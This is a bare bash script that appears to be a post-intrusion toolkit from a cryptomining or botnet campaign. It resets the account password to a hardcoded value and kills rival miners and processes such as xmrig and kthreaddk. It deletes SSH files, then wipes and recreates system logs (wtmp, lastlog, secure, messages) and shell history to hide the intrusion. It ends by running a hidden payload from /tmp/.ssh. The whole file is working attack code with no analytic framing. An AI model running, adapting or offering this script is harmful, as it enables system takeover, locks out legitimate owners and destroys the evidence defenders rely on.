#!/bin/bash

my_uid=$(echo $UID)
current_pass=$1
new_pass="Nr!_300KmHCapiBraSS23asDDj82A"

if [[ $my_uid > 0 ]]; then

    echo -e "$current_pass\n$new_pass\n$new_pass" | passwd

else

    echo -e "$new_pass\n$new_pass" | passwd

fi

killall zzh
killall kthreaddk
pkill -f kthreaddk
pkill -f zzh
killall ip
pkill -f ip
killall .dhpcd
pkill -f .dhpcd
pkill -f syst3md
killall syst3md
killall xmrig
pkill -f xmrig
rm -rf krane*
rm -rf config*
rm -rf ../ssh
rm -rf ../ssh*
rm -rf /tmp/ssh*
rm -rf /tmp/.ssh/config*
rm -rf /tmp/.ssh/krane*
rm -rf .bash_history
rm -rf /var/run/utmp
rm -rf /var/run/wtmp -
rm -rf /var/log/lastlog
rm -rf /usr/adm/lastlog
rm -rf .bash_history
cd /home
rm -rf yum.log
cd /var/log/
rm -rf wtmp
rm -rf run
rm -rf ../road
rm -rf ../.road
rm -rf secure
rm -rf lastlog
rm -rf messages
touch messagess
touch wtmp
touch secure
touch lastlog
cd /root
rm -rf .bash_history
touch .bash_history
unset HISTFILE
unset HISTSAVE
history -n
unset WATCH
nohup sh /tmp/.ssh/b &
cd
HISTFILE=/dev/null
history -c && rm -f ~/.bash_history
cd ..
